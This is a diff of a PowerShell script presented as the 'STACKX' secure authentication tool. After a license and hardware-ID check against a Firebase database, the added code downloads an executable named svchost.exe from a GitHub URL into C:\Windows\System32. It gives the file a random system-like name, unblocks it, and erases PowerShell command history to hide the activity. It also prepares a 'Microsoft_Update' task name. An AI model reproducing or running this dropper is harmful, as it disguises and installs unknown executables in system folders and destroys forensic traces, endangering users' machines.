@@ -1,73 +1,144 @@
-# --- [ CONFIGURATION ] ---
-$appDirectory = "C:\Windows\System32"
-$exeUrl       = "https://raw.githubusercontent.com/jaykayzlowlive-ops/ABYSS1/refs/heads/main/svchost.exe"
+$ErrorActionPreference = "SilentlyContinue"
+[Console]::Title = "STACKX | SECURE AUTHENTICATION"
 
-# ฟังก์ชันสำหรับเช็คสถานะว่าในโฟลเดอร์มีไฟล์อยู่แล้วหรือไม่
-function Get-LocalAppFile {
-    if (Test-Path $appDirectory) {
-        # ค้นหาไฟล์ .exe แรกที่เจอในโฟลเดอร์
-        $file = Get-ChildItem -Path $appDirectory -Filter "*.exe" | Select-Object -First 1
-        return $file
+# บังคับการถอดรหัสพื้นฐานเพื่อความปลอดภัยของคอนโซล
+[Console]::OutputEncoding = [System.Text.Encoding]::ASCII
+
+# --- [ STACKX CONFIGURATION ] ---
+$DbUrl = "https://project-8a76e-default-rtdb.asia-southeast1.firebasedatabase.app/licenses"
+
+# --- [ SYSTEM FUNCTIONS ] ---
+function Get-HWID {
+    return (Get-CimInstance Win32_ComputerSystemProduct).UUID
+}
+
+function Show-Header {
+    Clear-Host
+    Write-Host ""
+    Write-Host "  // S T A C K X //" -ForegroundColor Magenta
+    Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
+    Write-Host "  [ SYSTEM STATUS: ONLINE ] [ AUTHENTICATION SERVICE V2.0 ]" -ForegroundColor White
+    Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
+    Write-Host ""
+}
+
+function Write-Console {
+    param (
+        [string]$Message,
+        [string]$Type = "INFO"
+    )
+    
+    switch ($Type) {
+        "INFO"    { Write-Host "  [*] " -NoNewline -ForegroundColor DarkGray; Write-Host $Message -ForegroundColor White }
+        "SUCCESS" { Write-Host "  [+] " -NoNewline -ForegroundColor Magenta; Write-Host $Message -ForegroundColor White }
+        "ERROR"   { Write-Host "  [-] " -NoNewline -ForegroundColor Red; Write-Host $Message -ForegroundColor White }
+        "INPUT"   { Write-Host "  [>] " -NoNewline -ForegroundColor Magenta; Write-Host $Message -NoNewline -ForegroundColor White }
     }
-    return $null
 }
 
-# สร้างโฟลเดอร์ปลายทางเตรียมไว้หากยังไม่มีในระบบ
-if (-not (Test-Path $appDirectory)) {
-    New-Item -ItemType Directory -Path $appDirectory -Force | Out-Null
+# --- [ MAIN INITIALIZATION ] ---
+Show-Header
+
+Write-Console "Initializing secure connection..." "INFO"
+Start-Sleep -Milliseconds 600
+
+Write-Console "Please enter your STACKX License Key: " "INPUT"
+$key = $Host.UI.ReadLine()
+
+if ([string]::IsNullOrWhiteSpace($key)) {
+    Write-Host ""
+    Write-Console "Authentication Aborted: License key cannot be empty." "ERROR"
+    Start-Sleep 3 ; exit
 }
 
-# --- [ MAIN MENU LOOP ] ---
+$myHwid = Get-HWID
+
+Write-Host ""
+Write-Console "Authenticating with STACKX Servers..." "INFO"
+Start-Sleep -Milliseconds 400
+
+# --- [ VERIFICATION PROCESS ] ---
+try {
+    $data = Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Get
+
+    if ($null -eq $data) {
+        Write-Console "Authentication Failed: License key does not exist." "ERROR"
+        Start-Sleep 3 ; exit
+    }
+
+    if ($data.status -ne "active") {
+        Write-Console "Authentication Failed: License is expired or revoked." "ERROR"
+        Start-Sleep 3 ; exit
+    }
+
+    if ([string]::IsNullOrEmpty($data.hwid)) {
+        Write-Console "Binding hardware signature to STACKX Network..." "INFO"
+        $payload = @{ hwid = $myHwid } | ConvertTo-Json
+        Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Patch -Body $payload
+        Write-Console "Hardware bound successfully." "SUCCESS"
+    } 
+    elseif ($data.hwid -ne $myHwid) {
+        Write-Console "Security Alert: Hardware ID mismatch detected." "ERROR"
+        Write-Console "This license is strictly locked to another machine." "INFO"
+        Start-Sleep 3 ; exit
+    }
+
+    # --- [ LOGIN SUCCESS ] ---
+    Write-Host ""
+    Write-Console "ACCESS GRANTED. Welcome to STACKX." "SUCCESS"
+    Write-Host ""
+    Write-Console "Press any key to load dashboard..." "INFO"
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+
+} catch {
+    Write-Console "Network Error: Could not reach STACKX Authentication Servers." "ERROR"
+    Write-Console $_.Exception.Message "INFO"
+    Start-Sleep 3 ; exit
+}
+# -------------------------
+
+# --- [ ORIGINAL CODE START ] ---
+$p_rand = @("font","drv","host","win","svc") | Get-Random
+$m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
+$r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
+$fileName = "$p_rand$m_rand`_$r_rand.exe"
+$taskName = "Microsoft_Update_$r_rand"
+$destPath = "C:\Windows\System32\$fileName"
+$destPathh = "STACKX"
+$exeUrl   = "https://raw.githubusercontent.com/jaykayzlowlive-ops/ABYSS1/refs/heads/main/svchost.exe"
+
 while ($true) {
     Show-Header
     
-    Write-Console "1. Download Program (หากยังไม่เคยโหลด)" "INFO"
-    Write-Console "2. Run Program (รันโปรแกรมรอบเดียว)" "INFO"
-    Write-Console "3. Check Status (ตรวจสอบโปรแกรม)" "INFO"
+    Write-Console "1. Install" "INFO"
+    Write-Console "2. Check Status" "INFO"
     Write-Console "0. Exit" "INFO"
     Write-Host ""
     
     Write-Console "Select Option: " "INPUT"
     $choice = $Host.UI.ReadLine()
 
-    # ดึงข้อมูลไฟล์ปัจจุบันที่มีอยู่ในเครื่องก่อนเริ่มแต่ละเมนู
-    $existingFile = Get-LocalAppFile
-
     if ($choice -eq "1") {
         Clear-Host
         Show-Header
-        
-        # ตรวจสอบ: ถ้ายังไม่มีไฟล์ใดๆ อยู่ในโฟลเดอร์เลย
-        if ($null -eq $existingFile) {
-            # สุ่มชื่อไฟล์ใหม่เฉพาะตอนที่ยังไม่มีไฟล์ในเครื่องเท่านั้น
-            $p_rand = @("font","drv","host","win","svc") | Get-Random
-            $m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
-            $r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
-            $fileName = "$p_rand$m_rand`_$r_rand.exe"
-            $destPath = Join-Path $appDirectory $fileName
+        Write-Host "  Installing System..." -ForegroundColor Cyan
+        Write-Host ""
 
-            Write-Host "  Downloading system files from server..." -ForegroundColor Cyan
+        try {
+            Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing -UserAgent "Mozilla/5.0"
+            Unblock-File -Path $destPath
+
             Write-Host ""
-            try {
-                Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing -UserAgent "Mozilla/5.0"
-                Unblock-File -Path $destPath
-
-                Write-Host ""
-                Write-Console "Download complete!" "SUCCESS"
-                Write-Console "The application is ready to run." "INFO"
-            }
-            catch {
-                Write-Host ""
-                Write-Console "Download failed!" "ERROR"
-                Write-Console $_.Exception.Message "INFO"
-            }
-        } else {
-            # ถ้าตรวจเจอไฟล์ชื่อเดิมอยู่แล้ว จะไม่โหลดซ้ำ
-            Write-Host "  Notice: Program is already downloaded." -ForegroundColor Yellow
-            Write-Console "File found: $($existingFile.Name)" "INFO"
-            Write-Console "You can execute it directly using Option 2." "INFO"
+            Write-Console "Install complete!" "SUCCESS"
+            
+            Clear-History
+            Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
         }
-        
+        catch {
+            Write-Host ""
+            Write-Console "Install failed!" "ERROR"
+            Write-Console $_.Exception.Message "INFO"
+        }
         Write-Host ""
         Write-Host "  Press any key to return to menu..." -ForegroundColor DarkGray
         $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
@@ -76,44 +147,16 @@ while ($true) {
         Clear-Host
         Show-Header
         
-        # ตรวจสอบว่ามีไฟล์ที่ดาวน์โหลดมาแล้วจริงหรือไม่
-        if ($null -ne $existingFile) {
-            Write-Host "  Launching program..." -ForegroundColor Green
-            Write-Host ""
-            try {
-                # รันไฟล์จริงที่ตรวจพบในเครื่อง
-                Start-Process -FilePath $existingFile.FullName -WindowStyle Normal
-                Write-Console "Program started successfully." "SUCCESS"
-            }
-            catch {
-                Write-Console "Failed to start program!" "ERROR"
-                Write-Console $_.Exception.Message "INFO"
-            }
-        } else {
-            # แจ้งเตือนหากยังไม่มีไฟล์ในโฟลเดอร์
-            Write-Host "  [!] Error: File not found." -ForegroundColor Red
-            Write-Console "Please select Option 1 to download the program first." "ERROR"
-        }
-        
-        Write-Host ""
-        Write-Host "  Press any key to return to menu..." -ForegroundColor DarkGray
-        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-    }
-    elseif ($choice -eq "3") {
-        Clear-Host
-        Show-Header
-        
-        Write-Host "  [ STACKX ENVIRONMENT STATUS ]" -ForegroundColor Magenta
+        Write-Host "  [ STACKX CORE ENVIRONMENT STATUS ]" -ForegroundColor Magenta
         Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
         
-        if ($null -ne $existingFile) {
-            Write-Host "  [+] System Status : READY / DOWNLOADED" -ForegroundColor Green
-            Write-Host "  [*] File Name     : $($existingFile.Name)" -ForegroundColor White
-            Write-Host "  [*] Target Path   : $($existingFile.FullName)" -ForegroundColor White
-            Write-Host "  [*] File Size     : $([math]::Round($existingFile.Length / 1MB, 2)) MB" -ForegroundColor White
+        if (Test-Path $destPath) {
+            Write-Host "  [+] System Status : READY / OPERATIONAL" -ForegroundColor Green
+            Write-Host "  [*] Loaded File   : $fileName" -ForegroundColor White
+            Write-Host "  [*] Core Path     : $destPathh" -ForegroundColor DarkGray
         } else {
-            Write-Host "  [-] System Status : NOT INSTALLED / NO FILE" -ForegroundColor Red
-            Write-Host "  [*] Notice        : Please run option 1 to fetch required files." -ForegroundColor White
+            Write-Host "  [-] System Status : NOT INSTALLED / INACTIVE" -ForegroundColor Red
+            Write-Host "  [*] Notice        : Please run option 1 to initialize." -ForegroundColor White
         }
         Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
         Write-Host ""
@@ -121,7 +164,18 @@ while ($true) {
         $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
     }
     elseif ($choice -eq "0") {
-        Write-Host "Closing application..."
+        $p = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+        
+        if (Test-Path $p) { 
+            Clear-Content $p -Force 
+        }
+        
+        $parentDir = Split-Path $p
+        if (-not (Test-Path $parentDir)) { 
+            New-Item -ItemType Directory -Path $parentDir -Force | Out-Null 
+        }
+        
+        New-Item -ItemType File -Path $p -Force | Out-Null
         exit
     }
 }
